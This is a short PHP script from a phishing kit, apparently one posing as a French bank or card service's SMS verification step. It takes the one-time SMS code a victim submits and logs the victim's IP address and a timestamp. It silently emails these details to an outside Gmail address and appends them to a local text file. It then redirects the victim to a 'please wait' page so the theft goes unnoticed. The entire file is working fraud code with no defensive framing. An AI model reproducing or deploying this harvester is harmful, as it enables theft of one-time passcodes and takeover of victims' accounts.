<?php
$date = gmdate("H:i:s | d/m/Y");
$ip = getenv("REMOTE_ADDR");
$message .= "~~~~~~~~~~~~~~~~~ SMS CARR IT SMS ~~~~~~~~~~~~~~\n\r";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\r";
$message .= "sms              :     ".$_POST[otp]."\n\r";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\r";
$message .= "IP                    :     $ip\n\r";
$message .= "DATE                  :     $date\n\r";
$message .= "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\r\n\r";

$send = "louannedu490@gmail.com";
$subject = "CARR IT SMS ";
$from .= "From: ACHRAF ";
$from .= 'MIME-Version: 1.0' . "\r\n";


@mail($send,$subject,$message,$from);

$fp = fopen('Cool.txt', 'a');
fwrite($fp, $message);
fclose($fp);

?>
<SCRIPT LANGUAGE="JavaScript">
document.location.href="patientez.html"
</SCRIPT>
 